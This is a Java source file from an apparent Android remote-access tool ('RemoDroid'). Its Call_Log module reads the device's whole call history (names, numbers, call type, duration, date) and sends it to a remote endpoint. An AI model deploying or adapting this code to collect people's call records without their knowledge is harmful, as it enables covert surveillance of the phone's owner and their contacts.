package com.remo.Features;

import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import com.remo.App;
import com.remo.Connections.DataHandler;
import com.remo.Connections.Feature;

import java.io.UnsupportedEncodingException;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

public class Call_Log extends Feature {

   public Call_Log(){
       UseMainConnection = false;
       Feature_type = DataHandler.eDataType.CALL_LOG.ordinal();
   }

    @Override
    public void AsyncTaskFunc(String Params) {
        //Log.d("REMODROID",getList(path));
        try {
            String toSend = getList();

            sendPacket(toSend.getBytes("UTF-8"));
          //  Log.d("REMODROID",toSend);
        } catch (UnsupportedEncodingException | SecurityException ex) {
            Log.e("REMODROID","Contacts Exception");
        }
    }

    @Override
    public void update(String Params) {

    }


    private String getList() throws SecurityException{
        StringBuilder sb = new StringBuilder();


        String[] projection = new String[] {
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };

        Cursor cursor =  App.get().getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, "date DESC");

        while (cursor.moveToNext()) {
            String name = cursor.getString(0);
            String number = cursor.getString(1);
            String type = cursor.getString(2); // https://developer.android.com/reference/android/provider/CallLog.Calls.html#TYPE
            String time =getDate(cursor.getString(3)); // epoch time - https://developer.android.com/reference/java/text/DateFormat.html#parse(java.lang.String
            String dur =cursor.getString(4);
            switch (type) {
                case "1":
                    type = "IN";
                    break;
                case "2":
                    type = "OUT";
                    break;
                default:
                    type = "MISSED";
                    break;
            }

            dur = formatTime(Integer.parseInt(dur));

            char doubleQ = '\"';
            sb.append(doubleQ);
            sb.append(name);
            sb.append(doubleQ);
            sb.append("/");
            sb.append(doubleQ);
            sb.append(number);
            sb.append(doubleQ);
            sb.append("/");
            sb.append(doubleQ);
            sb.append(type);
            sb.append(doubleQ);
            sb.append("/");
            sb.append(doubleQ);
            sb.append(dur);
            sb.append(doubleQ);
            sb.append("/");
            sb.append(doubleQ);
            sb.append(time);
            sb.append(doubleQ);
            sb.append("\\");

        }
        cursor.close();
        return sb.toString();
    }


    private String getDate(String LongDate){
        Long timestamp = Long.parseLong(LongDate);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(timestamp);
        Date finaldate = calendar.getTime();
        return finaldate.toString();
    }

    public static String formatTime(long secs) {
        //long secs = millis / 1000;
        return String.format(Locale.US,"%02d:%02d:%02d", (secs % 86400) / 3600, (secs % 3600) / 60, secs % 60);
    }
}
